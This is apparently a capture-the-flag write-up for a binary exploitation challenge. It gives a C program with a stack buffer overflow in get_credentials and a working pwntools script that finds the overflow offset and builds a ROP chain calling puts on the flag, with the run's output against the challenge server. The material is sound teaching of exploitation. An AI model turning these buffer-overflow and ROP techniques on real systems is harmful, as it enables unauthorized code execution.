# Buffering 2
Category: Binary Exploitation, 250 points

## Description

> The flag service is under maintenance, but I think we can still get the flag, care to check?

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include "flag.h"

int get_credentials();
int authenticate_with_server(int *authenticated);
void print_flag();

extern char flag[100];
char debug_buffer[100] = {0};
char spinning_icon[4] = {'/', '-', '\\', '|'};

#define USERNAME_LENGTH 32
#define PASSWORD_LENGTH 64


int main() {
    int authenticated = 0;
    long int i = 0;

    printf("Hello and thank you for using Flag Distibuter v2.1 🚩🚩🚩\n");
	get_credentials();
    
    printf("Autenticating  ");
    while (!authenticate_with_server(&authenticated)) {
        printf("\b%c", spinning_icon[(i++) % 4]);
        fflush(stdout);
        sleep(0.91);
    }

    if(authenticated)
        print_flag();
	
    return 0;
}

int get_credentials() {
	char username[USERNAME_LENGTH] = {0};
    char password[PASSWORD_LENGTH] = {0};

    printf("To receive the flag, please enter your username and password\n");
    printf("Username: ");
    fflush(stdout);
	read(STDIN_FILENO, username, PASSWORD_LENGTH);
    printf("Password: ");
    fflush(stdout);
    read(STDIN_FILENO, password, PASSWORD_LENGTH);
}

void print_flag() {
	printf("This service is in maintenance, please try again later\n");
}

int authenticate_with_server(int *authenticated) {
    /*TODO: add authentication with server*/
    return 0;
}
```

## Solution

This is the follow-up for [Buffering 1](Buffering_1.md). Let's check the diff:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_2]
└─$ diff ../Buffering_1/buffering_1.c buffering_2.c
3c3
< #include <stdlib.h>
---
> #include <string.h>
10a11
> char debug_buffer[100] = {0};
21c22
<     printf("Hello and thank you for using Flag Distibuter v2.0 🚩🚩🚩\n");
---
>     printf("Hello and thank you for using Flag Distibuter v2.1 🚩🚩🚩\n");
25c26
<     while (!authenticate_with_server(&authenticated)){
---
>     while (!authenticate_with_server(&authenticated)) {
51,54c52,53
<       printf("Thank you for waiting, here's the flag: %s\n", flag);
<     fflush(stdout);
<     exit(0);
<  }
---
>       printf("This service is in maintenance, please try again later\n");
> }

```

The main difference is that `print_flag` won't actually print the flag.

`checksec` looks pretty much the same and still allows us to perform a buffer overflow in order to hijack the code execution path:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_2]
└─$ checksec --file ./buffering
[*] '/media/sf_CTFs/ducky_debug_duck/Buffering_2/buffering'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Therefore, we'll create a ROP to print the flag:

```python
# First, create a pwntools template by calling:
#  $ pwn template --host ctf.cs.technion.ac.il --port 4079 ./buffering
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

def send_payload(p, payload):
    p.recvuntil(b"Username: ")
    p.send(payload)
    p.recvuntil(b"Password: ")
    p.sendline(b"dummy")

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(90, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset


overflow_offset = get_overflow_offset()

log.info(f"flag address: {hex(exe.symbols['flag'])}")

rop = ROP(exe)
rop.puts(exe.symbols["flag"])

log.info(f"ROP:\n{rop.dump()}")

payload = fit({overflow_offset: rop.chain()})
io = start()
send_payload(io, payload)
print(io.recvall())
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/ducky_debug_duck/Buffering_2]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/ducky_debug_duck/Buffering_2/buffering'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/media/sf_CTFs/ducky_debug_duck/Buffering_2/buffering': pid 3705
[*] Process '/media/sf_CTFs/ducky_debug_duck/Buffering_2/buffering' stopped with exit code -11 (SIGSEGV) (pid 3705)
[+] Parsing corefile...: Done                                                                                                                                                                                    [*] '/media/sf_CTFs/ducky_debug_duck/Buffering_2/core.3705'
    Arch:      amd64-64-little
    RIP:       0x401360
    RSP:       0x7ffeb273be98
    Exe:       '/media/sf_CTFs/ducky_debug_duck/Buffering_2/buffering' (0x400000)
    Fault:     0x6161616161616166
[*] Overflow offset: 40
[*] flag address: 0x404060
[*] Loaded 14 cached gadgets for './buffering'
[*] ROP:
    0x0000:         0x4013f3 pop rdi; ret
    0x0008:         0x404060 [arg0] rdi = flag
    0x0010:         0x401084 puts
[+] Opening connection to ctf.cs.technion.ac.il on port 4079: Done
[+] Receiving all data: Done (27B)
[*] Closed connection to ctf.cs.technion.ac.il port 4079
b"flag{w3'll_r3turn_sh0rt1y}\n"
```